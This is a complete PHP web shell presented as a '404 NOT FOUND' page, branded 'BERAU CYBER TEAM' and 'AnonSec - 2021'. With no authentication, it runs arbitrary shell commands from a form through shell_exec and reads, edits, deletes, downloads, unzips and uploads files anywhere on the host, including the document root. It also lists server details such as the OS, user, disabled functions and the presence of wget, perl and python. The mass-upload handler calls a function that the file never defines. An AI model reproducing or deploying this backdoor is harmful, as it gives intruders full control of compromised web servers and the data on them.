<!DOCTYPE html>
<html>
<head>
    <title>404 NOT FOUND</title>
    <meta name="author" content="Anon7">
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="description" content="we are party at your security !">
    <meta property="og:description" content="we are party at your security !">
    <meta property="og:image" content="https://i.imgur.com/6RSyvoJ.jpg">
    <meta name="robots" content="noindex">
    <meta name="googlebot" content="noindex">
    <meta name="theme-color" content="#0a0a0a">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.13.0/css/all.min.css" rel="stylesheet">
    <style>
        @import url('https://fonts.googleapis.com/css?family=Share+Tech+Mono');
        @import url('https://fonts.googleapis.com/css?family=Orbitron');

        :root {
            --bg-primary: #0a0a0a;
            --bg-secondary: #1a1a1a;
            --bg-dark: #111111;
            --accent-green: #00ff00;
            --accent-green-dark: #00cc00;
            --text-primary: #e0e0e0;
            --text-secondary: #888888;
            --border-color: #333333;
            --danger: #ff3333;
            --warning: #ffaa00;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Share Tech Mono', monospace;
            background-color: var(--bg-primary);
            color: var(--text-primary);
            line-height: 1.5;
            overflow-x: hidden;
            background-image: 
                radial-gradient(circle at 10% 20%, rgba(0, 255, 0, 0.03) 0%, transparent 20%),
                radial-gradient(circle at 90% 80%, rgba(0, 255, 0, 0.03) 0%, transparent 20%);
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }

        /* Header */
        .header {
            text-align: center;
            padding: 20px 0;
            margin-bottom: 20px;
            border-bottom: 1px solid var(--accent-green);
            position: relative;
        }

        .header::before, .header::after {
            content: "◆";
            color: var(--accent-green);
            position: absolute;
            bottom: -10px;
            font-size: 20px;
        }

        .header::before {
            left: 20%;
        }

        .header::after {
            right: 20%;
        }

        .title {
            font-family: 'Orbitron', sans-serif;
            font-size: 32px;
            color: var(--accent-green);
            text-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
            letter-spacing: 2px;
            margin-bottom: 5px;
        }

        .subtitle {
            font-size: 14px;
            color: var(--text-secondary);
            letter-spacing: 1px;
        }

        /* Navigation */
        .nav-container {
            background-color: var(--bg-dark);
            border: 1px solid var(--border-color);
            border-radius: 5px;
            margin-bottom: 20px;
            padding: 10px;
        }

        .nav-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 10px;
        }

        .nav-item {
            text-align: center;
        }

        .nav-link {
            display: block;
            padding: 10px 15px;
            background-color: var(--bg-secondary);
            color: var(--text-primary);
            text-decoration: none;
            border: 1px solid var(--border-color);
            border-radius: 3px;
            transition: all 0.3s;
            font-size: 14px;
        }

        .nav-link:hover {
            background-color: var(--bg-dark);
            border-color: var(--accent-green);
            color: var(--accent-green);
            box-shadow: 0 0 5px rgba(0, 255, 0, 0.3);
        }

        .nav-link.active {
            background-color: rgba(0, 255, 0, 0.1);
            border-color: var(--accent-green);
            color: var(--accent-green);
        }

        /* Server Info */
        .server-info {
            background-color: var(--bg-dark);
            border: 1px solid var(--border-color);
            border-radius: 5px;
            padding: 15px;
            margin-bottom: 20px;
            font-size: 13px;
        }

        .info-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
            gap: 10px;
        }

        .info-item {
            padding: 8px 0;
            border-bottom: 1px dotted var(--border-color);
            color: var(--text-secondary);
        }
        .info-item .info-value {
            color: var(--accent-green);
            font-weight: bold;
            float: right;
        }

        .status-on { color: var(--accent-green); }
        .status-off { color: var(--danger); }

        /* Breadcrumb */
        .breadcrumb {
            display: flex;
            align-items: center;
            flex-wrap: wrap;
            margin-bottom: 20px;
            padding: 10px 15px;
            background-color: var(--bg-dark);
            border: 1px solid var(--border-color);
            border-radius: 5px;
            font-size: 14px;
        }

        .breadcrumb a {
            color: var(--accent-green);
            text-decoration: none;
            transition: color 0.3s;
        }

        .breadcrumb a:hover {
            color: var(--text-primary);
            text-decoration: underline;
        }

        .breadcrumb-separator {
            margin: 0 10px;
            color: var(--text-secondary);
        }

        /* Table */
        /* File Browser Styles */
.file-table {
    width: 100%;
    border-collapse: collapse;
    margin-top: 20px;
}

.file-table th, .file-table td {
    padding: 10px;
    border: 1px solid var(--border-color);
    text-align: left;
    color: var(--text-primary); /* Warna putih */
}

.file-table th {
    background-color: var(--bg-dark);
    color: var(--accent-green); /* Header tetap hijau */
    font-weight: bold;
}

.file-table tr:hover {
    background-color: rgba(0, 255, 0, 0.05);
}

/* Semua teks dalam tabel menjadi putih */
.file-table td a {
    color: var(--text-primary); /* Warna putih untuk link */
    text-decoration: none;
}

.file-table td a:hover {
    color: var(--accent-green); /* Hijau saat hover */
}

.folder-icon {
    color: var(--accent-yellow); /* Ikon folder tetap kuning */
    margin-right: 8px;
}

.file-icon {
    color: var(--accent-blue); /* Ikon file tetap biru */
    margin-right: 8px;
}

        /* Forms */
        .form-container {
            background-color: var(--bg-dark);
            border: 1px solid var(--border-color);
            border-radius: 5px;
            padding: 20px;
            margin-bottom: 20px;
        }

        .form-title {
            color: var(--accent-green);
            margin-bottom: 15px;
            padding-bottom: 10px;
            border-bottom: 1px solid var(--border-color);
            font-size: 18px;
        }

        .form-group {
            margin-bottom: 15px;
        }

        .form-label {
            display: block;
            margin-bottom: 5px;
            color: var(--text-secondary);
            font-size: 14px;
        }

        .form-control {
            width: 100%;
            padding: 10px;
            background-color: var(--bg-secondary);
            border: 1px solid var(--border-color);
            border-radius: 3px;
            color: var(--text-primary);
            font-family: inherit;
            font-size: 13px;
        }

        .form-control:focus {
            outline: none;
            border-color: var(--accent-green);
            box-shadow: 0 0 5px rgba(0, 255, 0, 0.3);
        }

        textarea.form-control {
            min-height: 150px;
            resize: vertical;
        }

        .form-actions {
            display: flex;
            gap: 10px;
            margin-top: 15px;
        }

        .btn {
            padding: 8px 16px;
            border: 1px solid var(--border-color);
            border-radius: 3px;
            cursor: pointer;
            font-size: 13px;
            font-family: inherit;
            transition: all 0.3s;
        }

        .btn-primary {
            background-color: var(--accent-green);
            color: var(--bg-primary);
            border-color: var(--accent-green);
        }

        .btn-primary:hover {
            background-color: var(--accent-green-dark);
        }

        /* Alerts */
        .alert {
            padding: 12px 15px;
            border-radius: 3px;
            margin-bottom: 15px;
            border: 1px solid;
            font-size: 13px;
        }

        .alert-success {
            background-color: rgba(0, 255, 0, 0.1);
            color: var(--accent-green);
            border-color: var(--accent-green);
        }

        .alert-danger {
            background-color: rgba(255, 51, 51, 0.1);
            color: var(--danger);
            border-color: var(--danger);
        }

        /* Terminal */
        .terminal {
            background-color: #000;
            border: 1px solid var(--accent-green);
            border-radius: 5px;
            padding: 15px;
            margin-bottom: 20px;
            font-family: 'Courier New', monospace;
            color: var(--accent-green);
        }

        .terminal-header {
            display: flex;
            justify-content: space-between;
            margin-bottom: 10px;
            padding-bottom: 5px;
            border-bottom: 1px solid var(--border-color);
        }

        .terminal-title {
            color: var(--accent-green);
            font-weight: bold;
        }

        .terminal-content {
            min-height: 200px;
            max-height: 400px;
            overflow-y: auto;
        }

        .terminal-content pre {
            white-space: pre-wrap;
            word-break: break-all;
        }

        /* Footer */
        .footer {
            text-align: center;
            margin-top: 30px;
            padding: 20px;
            color: var(--text-secondary);
            border-top: 1px solid var(--border-color);
            font-size: 12px;
        }

        /* Action Form */
        .action-form {
            display: inline;
        }
        .action-select {
            display: inline;
            width: auto;
            padding: 5px;
            font-size: 12px;
            background-color: var(--bg-secondary);
            color: var(--text-primary);
            border: 1px solid var(--border-color);
            border-radius: 3px;
        }

        /* Permission Colors */
        .permission-writable { color: var(--accent-green); }
        .permission-denied { color: var(--danger); }
        .permission-normal { color: var(--text-primary); }

        /* Custom scrollbar */
        ::-webkit-scrollbar {
            width: 8px;
        }

        ::-webkit-scrollbar-track {
            background: var(--bg-dark);
        }

        ::-webkit-scrollbar-thumb {
            background: var(--accent-green);
            border-radius: 3px;
        }

        ::-webkit-scrollbar-thumb:hover {
            background: var(--accent-green-dark);
        }

        /* Responsive */
        @media (max-width: 768px) {
            .nav-grid {
                grid-template-columns: 1fr;
            }
            
            .info-grid {
                grid-template-columns: 1fr;
            }
            
            .file-table {
                display: block;
                overflow-x: auto;
            }
        }
    </style>
    <script>
function setfilename(val)
  {
    filename = val.split('\\').pop().split('/').pop();
    //filename = filename.substring(0, filename.lastIndexOf('.'));
    document.getElementById('namanya').value = filename;
  }

async function loadFile(file) {
    let text = await file.text();
    document.getElementById("bepasdata").innerHTML = text;
}
</script>
</head>
<body>
    <div class="container">
        <!-- Header -->
        <div class="header">
            <h1 class="title">BERAU CYBER TEAM</h1>
            <p class="subtitle">we are party at your security!</p>
        </div>

        <!-- PHP Code -->
        <?php
        //@set_time_limit(0);
        //@error_reporting(0);
        error_reporting(E_ALL);
        ini_set('display_errors', 1);

        $disfunc = @ini_get("disable_functions");
        if (empty($disfunc)) {
            $disf = "NONE";
        } else {
            $disf = $disfunc;
        }

        function author() {
            echo "<div class='footer'>AnonSec - 2021</div>";
        }

        function cekdir() {
            if (isset($_GET['path'])) {
                $lokasi = $_GET['path'];
            } else {
                $lokasi = getcwd();
            }
            if (is_writable($lokasi)) {
                return "Writeable";
            } else {
                return "Not Writeable";
            }
        }

        function cekroot() {
            if (is_writable($_SERVER['DOCUMENT_ROOT'])) {
                return "Writeable";
            } else {
                return "Not Writeable";
            }
        }

        function xrmdir($dir) {
            $items = scandir($dir);
            foreach ($items as $item) {
                if ($item === '.' || $item === '..') {
                    continue;
                }
                $path = $dir.'/'.$item;
                if (is_dir($path)) {
                    xrmdir($path);
                } else {
                    unlink($path);
                }
            }
            rmdir($dir);
        }

        function dunlut($file) {
            if (!is_readable($file)) {
                echo "<div class='alert alert-danger'>Cannot Download File / Unreadable File!</div>";
                die();
            }
            header('Content-Description: File Transfer');
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="'.basename($file).'"');
            header('Expires: 0');
            header('Cache-Control: must-revalidate');
            header('Pragma: public');
            header('Content-Length: ' . filesize($file));
            flush();
            readfile($file);
            die();
        }

        function owner($file) {
            if (function_exists("posix_getpwuid")) {
                $tod = @posix_getpwuid(fileowner($file));
                return $tod['name'];
            } else {
                return fileowner($file);
            }
        }

        function cekwrite($lokasi) {
            $izin = substr(sprintf('%o', fileperms($lokasi)), -4);
            return $izin;
        }

        function ekse($komend, $lokasi) {
            if (!function_exists("proc_open")) {
                die("proc_open function disabled!");
            }
            $tod = @proc_open($komend." 2>&1", array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "r")), $pipes, $lokasi);
            $output = stream_get_contents($pipes[1]);
            echo "<pre>".htmlspecialchars($output)."</pre>";
        }

        function ipserv() {
            if (empty($_SERVER['SERVER_ADDR'])) {
                $ip = gethostbyname($_SERVER['SERVER_NAME']);
                if (empty($ip)) {
                    return $_SERVER['SERVER_NAME'];
                }
                return $ip;
            } else {
                return $_SERVER['SERVER_ADDR'];
            }
        }

        function filedate($file) {
            return date("F d Y H:i:s", filemtime($file));
        }

        function unzip($file, $lokasi) {
            if (!is_readable($file)) {
                echo "<div class='alert alert-danger'>Cannot Unzip File / Unreadable File!</div>";
                return;
            }
            $zip = new ZipArchive;
            $res = $zip->open($file);
            if ($res === TRUE) {
                $zip->extractTo($lokasi);
                $zip->close();
                echo "<div class='alert alert-success'>Success Unzip File!</div>";
            } else {
                echo "<div class='alert alert-danger'>Failed to Unzip File!</div>";
            }
        }

        function statusnya($file){
            $izin = substr(sprintf('%o', fileperms($file)), -4);
            return $izin;
        }

        // Process POST data
        foreach($_POST as $key => $value){
            $_POST[$key] = stripslashes($value);
        }

        // Set current location
        if(isset($_GET['path'])){
            $lokasi = $_GET['path'];
        } else {
            $lokasi = getcwd();
        }

        $lokasi = str_replace('\\','/',$lokasi);
        $lokasis = explode('/',$lokasi);
        $lokasinya = @scandir($lokasi);

        echo '<div class="server-info">';
        echo "Server IP : <font color=gold>".ipserv()."</font> &nbsp;/&nbsp; Your IP : <font color=gold>".$_SERVER['REMOTE_ADDR']."</font><br>";
        echo "Web Server : <font color='gold'>".$_SERVER['SERVER_SOFTWARE']."</font><br>";
        echo "System : <font color='gold'>".php_uname()."</font><br>";
        echo "User : <font color='gold'>".@get_current_user()."&nbsp;</font>( <font color='gold'>".@getmyuid()."</font>)<br>";
        echo "PHP Version : <font color='gold'>".@phpversion()."</font><br>";
        echo "Disable Function : ".$disf."</font><br>";
        echo "MySQL : ";

        if (function_exists("mysql_connect")) {
            echo "<font color=green>ON</font>";
        } else {
            echo "<font color=red>OFF</font>";
        }
        echo " &nbsp;|&nbsp; cURL : ";
        if (function_exists("curl_init")) {
            echo "<font color=green>ON</font>";
        } else {
            echo "<font color=red>OFF</font>";
        }
        echo " &nbsp;|&nbsp; WGET : ";
        if (file_exists("/usr/bin/wget")) {
            echo "<font color=green>ON</font>";
        } else {
            echo "<font color=red>OFF</font>";
        }
        echo " &nbsp;|&nbsp; Perl : ";
        if (file_exists("/usr/bin/perl")) {
            echo "<font color=green>ON</font>";
        } else {
            echo "<font color=red>OFF</font>";
        }
        echo " &nbsp;|&nbsp; Python : ";
        if (file_exists("/usr/bin/python2")) {
            echo "<font color=green>ON</font>";
        } else {
            echo "<font color=red>OFF</font>";
        }
        echo '</div>';

        // Breadcrumb
        echo '<div class="breadcrumb">';
        echo '    Directory ('.cekwrite($lokasi).'): ';
        echo '    <a href="?path=/">/</a>';
        foreach($lokasis as $id => $lok){
            if($lok == '' && $id == 0) continue;
            if($lok == '') continue;
            echo '<span class="breadcrumb-separator">/</span>';
            echo '<a href="?path=';
            for($i=0;$i<=$id;$i++){
                echo "$lokasis[$i]";
                if($i != $id) echo "/";
            } 
            echo '">'.$lok.'</a>';
        }
        echo '</div>';

        // Handle file upload
        if (isset($_POST['upwkwk'])) {
            if ($_POST['dirnya'] == "2") {
                $lokasi = $_SERVER['DOCUMENT_ROOT'];
            }
            if (isset($_POST['berkasnya'])) {
                $data = @file_put_contents($lokasi."/".$_FILES['berkas']['name'], @file_get_contents($_FILES['berkas']['tmp_name']));
                if (file_exists($lokasi."/".$_FILES['berkas']['name'])) {
                    echo '<div class="alert alert-success">File Uploaded! '.$lokasi."/".$_FILES['berkas']['name'].'</div>';
                } else {
                    echo '<div class="alert alert-danger">Failed to Upload!</div>';
                }
            }
        }
                // Handle mass upload
        if (isset($_POST['mass_upload'])) {
            $targetDir = $_POST['mass_dir'] ?? $lokasi;
            massUpload($targetDir, $_FILES['mass_files']);
        }

        // Navigation
        $currentPage = 'home';
        if (isset($_GET['komend'])) {
            $currentPage = 'command';
        } elseif (isset($_GET['upload'])) {
            $currentPage = 'upload';
        } elseif (isset($_GET['mass_upload'])) {
            $currentPage = 'mass_upload';
        }

        echo '<div class="nav-container">';
        echo '    <div class="nav-grid">';
        echo '        <div class="nav-item">';
        echo '            <a href="'.$_SERVER['SCRIPT_NAME'].'" class="nav-link '.($currentPage == 'home' ? 'active' : '').'">';
        echo '                <i class="fas fa-home"></i> Home';
        echo '            </a>';
        echo '        </div>';
        echo '        <div class="nav-item">';
        echo '            <a href="?path='.$lokasi.'&komend=gaskan" class="nav-link '.($currentPage == 'command' ? 'active' : '').'">';
        echo '                <i class="fas fa-terminal"></i> Command';
        echo '            </a>';
        echo '        </div>';
        echo '        <div class="nav-item">';
        echo '            <a href="?path='.$lokasi.'&upload=gaskan" class="nav-link '.($currentPage == 'upload' ? 'active' : '').'">';
        echo '                <i class="fas fa-upload"></i> Upload File';
        echo '            </a>';
        echo '        </div>';
        echo '        <div class="nav-item">';
        echo '            <a href="?path='.$lokasi.'&mass_upload=gaskan" class="nav-link '.($currentPage == 'mass_upload' ? 'active' : '').'">';
        echo '                <i class="fas fa-layer-group"></i> Mass Upload';
        echo '            </a>';
        echo '        </div>';
        echo '    </div>';
        echo '</div>';

        // Content Area
        if (isset($_GET['fileloc'])) {
            echo '<div class="form-container">';
            echo '    <h3 class="form-title">File Content: '.$_GET['fileloc'].'</h3>';
            echo '    <textarea class="form-control" rows="20" readonly>'.htmlspecialchars(file_get_contents($_GET['fileloc'])).'</textarea>';
            echo '</div>';
        } elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "hapus") {
            if (is_dir($_POST['path'])) {
                xrmdir($_POST['path']);
                if (!file_exists($_POST['path'])) {
                    echo '<div class="alert alert-success">Delete Directory Success!</div>';
                } else {
                    echo '<div class="alert alert-danger">Failed to delete Directory!</div>';
                }
            } elseif (is_file($_POST['path'])) {
                @unlink($_POST['path']);
                if (!file_exists($_POST['path'])) {
                    echo '<div class="alert alert-success">Delete File '.basename($_POST['path']).' Success!</div>';
                } else {
                    echo '<div class="alert alert-danger">Failed to Delete File!</div>';
                }
            }
        } elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "gantinama") {
            if (isset($_POST['gantin'])) {
                $ren = @rename($_POST['path'], $_POST['newname']);
                if ($ren) {
                    echo '<div class="alert alert-success">Change Name Success!</div>';
                } else {
                    echo '<div class="alert alert-danger">Change Name Failed!</div>';
                }
            }
        } elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "edit") {
            if (isset($_POST['gasedit'])) {
                $edit = @file_put_contents($_POST['path'], $_POST['src']);
                if ($edit) {
                    echo '<div class="alert alert-success">Edit File Success!</div>';
                } else {
                    echo '<div class="alert alert-danger">Edit File Failed!</div>';
                }
            }
        } elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "dunlut") {
            dunlut($_POST['path']);
        } elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "unzip") {
            unzip($_POST['path'], $lokasi);
        } elseif (isset($_GET['upload'])) {
            echo '<div class="form-container">';
            echo '    <h3 class="form-title"><i class="fas fa-upload"></i> Upload File</h3>';
            echo '    <form enctype="multipart/form-data" method="post">';
            echo '        <div class="form-group">';
            echo '            <div class="form-label">Target Directory:</div>';
            echo '            <label><input type="radio" value="1" name="dirnya" checked> Current Directory [ '.cekdir().' ]</label><br>';
            echo '            <label><input type="radio" value="2" name="dirnya"> Document Root [ '.cekroot().' ]</label>';
            echo '        </div>';
            echo '        <div class="form-group">';
            echo '            <div class="form-label">Select File:</div>';
            echo '            <input type="file" name="berkas" class="form-control">';
            echo '        </div>';
            echo '        <div class="form-actions">';
            echo '            <input type="hidden" name="upwkwk" value="aplod">';
            echo '            <input type="submit" name="berkasnya" value="Upload File" class="btn btn-primary">';
            echo '        </div>';
            echo '    </form>';
            echo '</div>';
        } elseif (isset($_GET['komend'])) {
            echo '<div class="form-container">';
            echo '    <h3 class="form-title"><i class="fas fa-terminal"></i> Command Execution</h3>';
            echo '    <form method="post">';
            echo '        <div class="form-group">';
            echo '            <div class="form-label">Command:</div>';
            echo '            <div style="display:flex;align-items:center;">';
            echo '                <span style="background:var(--accent-green);color:var(--bg-primary);padding:10px;border-radius:3px 0 0 3px;font-weight:bold;">$</span>';
            echo '                <input type="text" name="komend" class="form-control" style="border-radius:0 3px 3px 0;margin-left:0;" placeholder="Enter command..." value="'.(isset($_POST['komend']) ? htmlspecialchars($_POST['komend']) : '').'">';
            echo '            </div>';
            echo '        </div>';
            echo '        <div class="form-actions">';
            echo '            <input type="submit" name="eksekomend" value="Execute" class="btn btn-primary">';
            echo '        </div>';
            echo '    </form>';
            if (isset($_POST['eksekomend'])) {
                echo '<div class="terminal">';
                echo '    <div class="terminal-header">';
                echo '        <div class="terminal-title">Command Output</div>';
                echo '    </div>';
                echo '    <div class="terminal-content">';
                if (!empty($_POST['komend'])) {
                    $output = shell_exec($_POST['komend'] . " 2>&1");
                    echo "<pre>" . htmlspecialchars($output) . "</pre>";
                }
                echo '    </div>';
                echo '</div>';
            }
                    } elseif (isset($_GET['mass_upload'])) {
            echo "<div class='server-info'>";
echo "<div class='server-info'>";
echo "<h3 style='color: var(--accent-green); margin-bottom: 15px;'><i class='fas fa-layer-group'></i> Mass Upload Files</h3>";
echo '<form enctype="multipart/form-data" method="post" class="upload-form">';
echo '<div class="form-group">';
echo '<label style="display: block; margin-bottom: 8px; color: var(--text-primary);">';
echo '<i class="fas fa-folder-open"></i> Target Directory:';
echo '</label>';
echo '<input type="text" name="mass_dir" value="'.$lokasi.'" class="form-input" style="width: 100%; padding: 8px; background: var(--bg-dark); color: var(--text-primary); border: 1px solid var(--border-color); border-radius: 3px;">';
echo '</div>';

echo '<div class="form-group" style="margin: 20px 0;">';
echo '<label style="display: block; margin-bottom: 8px; color: var(--text-primary);">';
echo '<i class="fas fa-file-upload"></i> Select Files (Multiple):';
echo '</label>';
echo '<div class="file-input-container" style="border: 2px dashed var(--border-color); padding: 20px; text-align: center; border-radius: 5px; background: var(--bg-dark);">';
echo '<input type="file" name="mass_files[]" multiple class="file-input" style="width: 100%; padding: 10px; background: transparent; color: var(--text-primary);" onchange="updateFileList(this)">';
echo '<div id="fileList" style="margin-top: 10px; font-size: 12px; color: var(--text-secondary);"></div>';
echo '</div>';
echo '</div>';

echo '<div class="form-group" style="text-align: center;">';
echo '<button type="submit" name="mass_upload" class="btn" style="background: var(--accent-green); color: var(--bg-primary); border: none; padding: 10px 25px; border-radius: 3px; cursor: pointer; font-weight: bold; transition: all 0.3s;">';
echo '<i class="fas fa-rocket"></i> Start Mass Upload';
echo '</button>';
echo '</div>';

echo '<div style="margin-top: 15px; padding: 10px; background: var(--bg-dark); border-radius: 3px; border-left: 3px solid var(--warning);">';
echo '<small style="color: var(--text-secondary);">';
echo '<i class="fas fa-info-circle"></i> This will upload selected files to ALL folders in the target directory';
echo '</small>';
echo '</div>';

echo '</form>';
echo '</div>';
            }  else {
            // File Browser
            if (!is_readable($lokasi)) {
                echo '<div class="alert alert-danger">This directory is unreadable :(</div>';
            } else {
                echo '<table class="file-table">';
                echo '    <thead>';
                echo '        <tr>';
                echo '            <th>Name</th>';
                echo '            <th>Size</th>';
                echo '            <th>Last Modified</th>';
                echo '            <th>Owner</th>';
                echo '            <th>Permissions</th>';
                echo '            <th>Actions</th>';
                echo '        </tr>';
                echo '    </thead>';
                echo '    <tbody>';
                
                // Directories
                foreach($lokasinya as $dir){
                    if(!is_dir($lokasi."/".$dir) || $dir == '.' || $dir == '..') continue;
                    $permClass = is_writable($lokasi."/".$dir) ? 'permission-writable' : 
                                (!is_readable($lokasi."/".$dir) ? 'permission-denied' : 'permission-normal');
                    
                    echo '<tr>';
                    echo '    <td><i class="fas fa-folder file-icon folder-icon"></i> <a href="?path='.$lokasi.'/'.$dir.'">'.$dir.'</a></td>';
                    echo '    <td>--</td>';
                    echo '    <td>'.filedate($lokasi."/".$dir).'</td>';
                    echo '    <td>'.owner($lokasi."/".$dir).'</td>';
                    echo '    <td><span class="'.$permClass.'">'.statusnya($lokasi."/".$dir).'</span></td>';
                    echo '    <td>';
                    echo '        <form method="POST" action="?pilihan&path='.$lokasi.'" class="action-form">';
                    echo '            <select name="pilih" onchange="this.form.submit()" class="action-select">';
                    echo '                <option value="">Action</option>';
                    echo '                <option value="hapus">Delete</option>';
                    echo '                <option value="gantinama">Rename</option>';
                    echo '            </select>';
                    echo '            <input type="hidden" name="type" value="dir">';
                    echo '            <input type="hidden" name="name" value="'.$dir.'">';
                    echo '            <input type="hidden" name="path" value="'.$lokasi.'/'.$dir.'">';
                    echo '        </form>';
                    echo '    </td>';
                    echo '</tr>';
                }
                
                // Files
                foreach($lokasinya as $file) {
                    if(!is_file($lokasi."/".$file)) continue;
                    $size = filesize($lokasi."/".$file)/1024;
                    $size = round($size,3);
                    $sizeDisplay = ($size >= 1024) ? round($size/1024,2).' MB' : $size.' KB';
                    $permClass = is_writable($lokasi."/".$file) ? 'permission-writable' : 
                                (!is_readable($lokasi."/".$file) ? 'permission-denied' : 'permission-normal');
                    
                    echo '<tr>';
                    echo '    <td><i class="fas fa-file file-icon" style="color: var(--accent-green)"></i> <a href="?fileloc='.$lokasi.'/'.$file.'&path='.$lokasi.'">'.$file.'</a></td>';
                    echo '    <td>'.$sizeDisplay.'</td>';
                    echo '    <td>'.filedate($lokasi."/".$file).'</td>';
                    echo '    <td>'.owner($lokasi."/".$file).'</td>';
                    echo '    <td><span class="'.$permClass.'">'.statusnya($lokasi."/".$file).'</span></td>';
                    echo '    <td>';
                    echo '        <form method="POST" action="?pilihan&path='.$lokasi.'" class="action-form">';
                    echo '            <select name="pilih" onchange="this.form.submit()" class="action-select">';
                    echo '                <option value="">Action</option>';
                    echo '                <option value="hapus">Delete</option>';
                    echo '                <option value="dunlut">Download</option>';
                    echo '                <option value="gantinama">Rename</option>';
                    echo '                <option value="edit">Edit</option>';
                    if (class_exists("ZipArchive")) {
                        echo '                <option value="unzip">Unzip</option>';
                    }
                    echo '            </select>';
                    echo '            <input type="hidden" name="type" value="file">';
                    echo '            <input type="hidden" name="name" value="'.$file.'">';
                    echo '            <input type="hidden" name="path" value="'.$lokasi.'/'.$file.'">';
                    echo '        </form>';
                    echo '    </td>';
                    echo '</tr>';
                }
                
                echo '    </tbody>';
                echo '</table>';
            }
        }

        author();
        ?>
    </div>

    <script>
        function setfilename(val) {
            filename = val.split('\\').pop().split('/').pop();
            document.getElementById('namanya').value = filename;
        }

        async function loadFile(file) {
            let text = await file.text();
            document.getElementById("bepasdata").innerHTML = text;
        }
    </script>
</body>
</html>